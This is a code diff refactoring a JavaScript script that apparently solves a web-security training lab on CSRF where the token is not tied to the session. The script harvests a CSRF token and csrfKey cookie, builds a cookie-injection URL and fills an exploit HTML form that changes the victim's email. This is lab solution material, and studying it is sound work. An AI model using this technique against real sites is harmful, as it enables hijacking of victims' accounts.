@@ -2,12 +2,17 @@ import { parse } from "node-html-parser";
 import { ExploitServer } from "../../../utils/exploitServer.js";
 import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
 import { runTasks } from "../../../utils/runTasks.js";
-import { createExploit } from "../utils/createExploit.js";
+import { Exploit } from "../utils/Exploit.js";
+import { getFileContent } from "../../../utils/getFileContent.js";
+import { extractCookie } from "../../../utils/extractCookie.js";
 
 const { labUrl, httpClient } = getParsedInputFromUser({
   description: "Lab: CSRF where token is not tied to user session",
+  // TODO: rename to allowProxy, allowConcurrency
   proxy: true,
 });
+
+runTasks([task]);
 
 async function task() {
   const exploit = await getExploit();
@@ -19,42 +24,30 @@ async function task() {
   2. Press "Deliver exploit to victim" button`);
 }
 
-runTasks([task]);
-
 async function getExploit() {
-  const exploitFilePath = new URL("./exploit.html", import.meta.url);
+  const rawExploitContent = await getFileContent(
+    new URL("./exploit.html", import.meta.url),
+  );
+  const exploit = new Exploit(rawExploitContent);
+  const actionUrl = labUrl + "my-account/change-email";
+  const { csrfToken, csrfKey } = await getFromLogin();
+  const cookieExploitUrl = getCookieExploitUrl(csrfKey);
+  exploit.setFormAction(actionUrl);
+  exploit.setCsrfToken(csrfToken);
+  return setCookieExploitUrl(exploit.toString(), cookieExploitUrl);
+}
+
+async function getFromLogin() {
   const response = await httpClient.get(labUrl + "login");
   const csrfToken = extractCsrfToken(response.data);
-  const csrfKey = extractCsrfKey(response);
-  const cookieExploitUrl = getCookieExploitUrl(csrfKey);
-  const actionUrl = labUrl + "my-account/change-email";
-  let exploit = await createExploit(exploitFilePath, { actionUrl, csrfToken });
-  exploit = setCookieExploitUrl(exploit, cookieExploitUrl);
-  return exploit;
+  const csrfKey = extractCookie(response, "csrfKey").value;
+  return { csrfToken, csrfKey };
 }
 
 function extractCsrfToken(html) {
   const root = parse(html);
   const elem = root.querySelector(".login-form input[name='csrf']");
   return elem.getAttribute("value");
-}
-
-function extractCsrfKey(response) {
-  return extractCookie(response, "csrfKey");
-}
-
-function extractCookie(response, cookieName) {
-  const regex = new RegExp(`${cookieName}=(.+?)(?:;|$)`);
-  const cookies = response.headers["set-cookie"];
-  let value = null;
-  for (const cookie of cookies) {
-    let match = cookie.match(regex);
-    if (match) {
-      value = match[1];
-      break;
-    }
-  }
-  return value;
 }
 
 function getCookieExploitUrl(csrfKey) {
